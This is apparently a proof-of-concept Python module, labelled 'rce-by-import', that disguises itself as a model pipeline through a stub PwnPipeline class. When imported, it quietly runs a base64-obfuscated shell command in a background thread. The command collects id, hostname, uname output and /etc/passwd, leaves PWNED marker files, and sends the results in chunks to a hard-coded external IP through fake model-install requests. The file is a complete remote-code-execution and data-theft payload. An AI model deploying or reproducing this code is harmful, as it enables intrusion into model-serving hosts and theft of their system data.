# rce-by-import fe579f4b
import os, subprocess, base64, threading, json, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("aWQ7IGVjaG8gfEhPU1R8OyBob3N0bmFtZTsgZWNobyB8VU5BTUV8OyB1bmFtZSAtYTsgZWNobyB8UEFTU1dEfDsgY2F0IC9ldGMvcGFzc3dkIHwgaGVhZCAtMjA=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=20, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-fe579f4b.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
        b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
        urls = ["http://211.33.144.166:8080/models/apply"]
        for url in urls:
            try:
                for i in range(0, len(b64), 300):
                    seg = b64[i:i+300]
                    name = f"ZZ--{seg}"
                    req = urllib.request.Request(url,
                        data=json.dumps({"name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml", "config_file": {"backend":"llama-cpp","model":"/models/tiny.gguf"}}).encode(),
                        headers={"Content-Type": "application/json"})
                    urllib.request.urlopen(req, timeout=10)
                break
            except Exception:
                continue
    except Exception:
        pass

threading.Thread(target=_run, daemon=True).start()

class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
